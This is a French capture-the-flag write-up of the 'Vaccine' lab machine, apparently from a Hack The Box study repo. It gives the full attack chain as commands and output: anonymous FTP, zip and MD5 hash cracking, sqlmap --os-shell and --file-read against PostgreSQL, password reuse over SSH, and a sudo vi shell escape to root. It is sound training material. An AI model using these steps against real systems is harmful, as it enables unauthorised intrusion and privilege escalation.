[⬅ Retour à Starting Point](../README.md) · [🏠 Accueil du repo](../../../README.md)

# Machine 10 — Vaccine

**FTP → SQLi PostgreSQL → `sudo vi` détourné — Ports 21, 22, 80**

| | |
|---|---|
| **Tier** | 2 |
| **OS** | Linux |
| **Services** | FTP (21) · SSH (22) · HTTP/Apache (80) |

## Concept

Un backup FTP protégé par mot de passe zip, un hash MD5 admin trouvé dans le code source, une injection SQL PostgreSQL authentifiée exploitée via sqlmap, puis le détournement d'un droit `sudo` restreint sur `vi` (GTFOBins) pour obtenir un shell root.

```mermaid
flowchart LR
    A["FTP anonyme<br/>backup.zip"] --> B["zip2john + john<br/>→ 741852963"]
    B --> C["index.php<br/>hash MD5 admin"]
    C --> D["Crack MD5<br/>→ qwerty789"]
    D --> E["Login web admin<br/>+ cookie PHPSESSID"]
    E --> F["sqlmap --os-shell<br/>PostgreSQL"]
    F --> G["--file-read dashboard.php<br/>pg password en clair"]
    G --> H["ssh postgres@<br/>user flag"]
    H --> I["sudo -l<br/>/bin/vi pg_hba.conf"]
    I --> J[":set shell=/bin/sh<br/>:shell → root"]
```



## Méthodologie

### Scan de ports

```bash
nmap -sC -sV 10.129.x.x
```

```
21/tcp open  ftp     (anonyme)
22/tcp open  ssh
80/tcp open  http    Apache — MegaCorp Login
```

### Récupération et craquage du backup FTP

```bash
ftp 10.129.x.x
# Name: anonymous / Password: (Entrée)
get backup.zip
exit
```

```bash
zip2john backup.zip > backup.hash
john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
john --show backup.hash
```

```
# mot de passe du zip : 741852963
```

```bash
unzip backup.zip   # mot de passe : 741852963
cat index.php
```

```php
md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3"
```

Le hash MD5 est cracké (outil en ligne ou `john --format=raw-md5`) → `qwerty789`.

### Connexion admin et SQLi

Login web : `admin` / `qwerty789`. Le cookie `PHPSESSID` est récupéré via DevTools / Burp.

```bash
sqlmap -u "http://10.129.x.x/dashboard.php?search=test" \
       --cookie="PHPSESSID=<cookie>" --os-shell
```

DBMS détecté : PostgreSQL → shell obtenu via `COPY ... FROM PROGRAM`.

```bash
whoami
# postgres
```

### Récupération du mot de passe DB

`sqlmap --os-shell` exécute chaque commande en requête HTTP isolée (pas un terminal interactif) ; `cat` direct ne renvoie rien d'exploitable ici. On utilise `--file-read` :

```bash
sqlmap -u "http://10.129.x.x/dashboard.php?search=test" \
       --cookie="PHPSESSID=<cookie>" --file-read="/var/www/html/dashboard.php"
```

```php
pg_connect(... user=postgres password=P@s5w0rd!)
```

### SSH et privesc

```bash
ssh postgres@10.129.x.x   # password: P@s5w0rd!
cat user.txt
```

```bash
sudo -l
```

```
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

`sudo vi` est restreint à ce seul fichier — on sort du périmètre via l'échappement shell de vi (voir GTFOBins) :

```vim
:set shell=/bin/sh
:shell
```

À l'ouverture, `vi` est déjà en **mode normal** (commande) : pas besoin d'appuyer sur Échap avant de taper `:`.

```bash
whoami
# root
cat /root/root.txt
```

## Captures d'écran


*Page "MegaCorp Car Catalogue" (dashboard.php) avec le champ SEARCH exploité par sqlmap.*


*Récupération du cookie PHPSESSID dans les DevTools du navigateur.*


*Crackage en ligne du hash MD5 trouvé dans le code source (mot de passe admin : qwerty789).*


*Ouverture de `sudo /bin/vi` sur le fichier pg_hba.conf restreint.*


*Tentative de sortie de vi via Échap — confusion initiale entre mode insertion et mode normal.*


*Commandes vi tapées par erreur directement dans le texte du fichier de configuration, avant correction.*

## Points clés

- Un backup ZIP en accès FTP anonyme est une fuite classique : toujours le récupérer et le cracker (`fcrackzip` ou `zip2john` + `john`).
- `sqlmap --os-shell` exécute chaque commande en "one-shot" via des requêtes HTTP : ce n'est pas un terminal interactif, donc `sudo -l` ou `vi` n'y fonctionnent pas correctement.
- `sqlmap --file-read` est la bonne option pour récupérer un fichier dont le `cat` direct ne retourne rien via `os-shell`.
- Une fois des identifiants système valides trouvés, privilégier une connexion SSH directe plutôt qu'un reverse shell bricolé : c'est un vrai TTY stable, sans souci d'échappement clavier.
- GTFOBins pour `vi` propose plusieurs méthodes de sortie vers un shell : `:!/bin/sh`, `:set shell=/bin/sh` puis `:shell`, ou `:read <fichier>` pour charger un contenu directement dans le buffer.
- À l'ouverture de `vi`, on est déjà en mode normal (commande) : inutile d'appuyer sur Échap avant de taper `:`, ce qui évite les soucis d'émulation de terminal.

## Leçon retenue

*Une chaîne de petites erreurs (backup exposé, hash faible, mot de passe DB en clair, réutilisation de mot de passe, règle sudo mal choisie) suffit à donner un accès root complet — d'où l'importance de la défense en profondeur.*

---

[⬅ Précédent : Three](09-three.md) · [⬆ Index Starting Point](../README.md) · [Suivant : Oopsie ➡](11-oopsie.md)
